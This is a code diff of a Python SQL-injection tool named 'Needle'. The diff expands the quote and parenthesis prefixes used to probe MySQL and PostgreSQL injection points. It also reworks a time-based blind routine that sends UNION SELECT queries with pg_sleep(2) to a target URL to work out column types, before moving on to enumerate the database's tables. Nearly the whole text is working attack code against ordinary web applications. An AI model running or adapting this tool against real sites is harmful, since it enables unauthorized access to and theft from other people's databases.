@@ -98,7 +98,7 @@ for key, value in parameters.items():
 #---sql injection---
 print ("\n---Needle started---")
 #check for mysql injection
-for injection in "'", '"', "":
+for injection in "'", '"', "", "')", '")', ")":
 	if server != 0:
 		break
 	if injection == "":
@@ -152,7 +152,7 @@ if server == "mysql":
 		num_col += 1
 		j += "," + str(num_col)
 #check for postgresql injection and find the number of columns presented per result
-for injection in "'", '"', "":
+for injection in "'", "", "')", ')':
 	if server != 0:
 		break
 	if injection == "":
@@ -186,52 +186,50 @@ for injection in "'", '"', "":
 				print ("postgresql empty injection unsuccessful")
 			else:
 				print ("postgresql " + injection + " injection unsuccessful")
-			print ("coudn't find the number of columns presented per result, exiting")
-			sys.exit()
+			break
 		num_col += 1
 		j += ",null"
-	#find the type of the columns for postgresql injection
-	print ("finding the type of the columns presented per result...")
-	type = str()
-	order_list = ["\'needle\'"]
-	for i in range(0, num_col - 1):
-		order_list.append(",null")
-	count = 0
-	while True:
-		if count > 0:
-			order_list[count] = ",\'needle\'"
-		order_str = "".join(order_list)
-		query = valid_search + injection + " union select " + order_str + " from pg_sleep(2);--"
-		parameters[asterisk] = query
-		start = time.time()
-		try:
-			cookies
-		except NameError:
-			req = requests.post(url, data=parameters)
-		else:
-			req = requests.post(url, cookies=cookies, data=parameters)
-		end = time.time()
-		if end - start < 3 and end - start > 1.9:
-			type += order_list[count]
-		elif count == 0:
-			order_list[0] = "null"
-			type += "null"
-		else:
-			order_list[count] = ",null"
-			type += ",null"
-		count += 1
-		if count > len(order_list) - 1:
-			break
-	if len(type) > 0:
-		print ("found the type of the columns presented per result")
-	else:
-		print ("couldn't find the type of the columns presented per result, exiting")
-		sys.exit()
 #if none of the injections worked exit
 if server == 0:
 	print ("sql injection unsuccessful, exiting")
 	sys.exit()
-
+#find the type of the columns for postgresql
+print ("finding the type of the columns presented per result...")
+type = str()
+order_list = ["\'needle\'"]
+for i in range(0, num_col - 1):
+	order_list.append(",null")
+count = 0
+while True:
+	if count > 0:
+		order_list[count] = ",\'needle\'"
+	order_str = "".join(order_list)
+	query = valid_search + inject + " union select " + order_str + " from pg_sleep(2);--"
+	parameters[asterisk] = query
+	start = time.time()
+	try:
+		cookies
+	except NameError:
+		req = requests.post(url, data=parameters)
+	else:
+		req = requests.post(url, cookies=cookies, data=parameters)
+	end = time.time()
+	if end - start < 3 and end - start > 1.9:
+		type += order_list[count]
+	elif count == 0:
+		order_list[0] = "null"
+		type += "null"
+	else:
+		order_list[count] = ",null"
+		type += ",null"
+	count += 1
+	if count > len(order_list) - 1:
+		break
+if len(type) > 0:
+	print ("found the type of the columns presented per result")
+else:
+	print ("couldn't find the type of the columns presented per result, exiting")
+	sys.exit()
 #find all the tables of the current database
 print ("finding all the tables of the current database...")
 if server == "mysql":
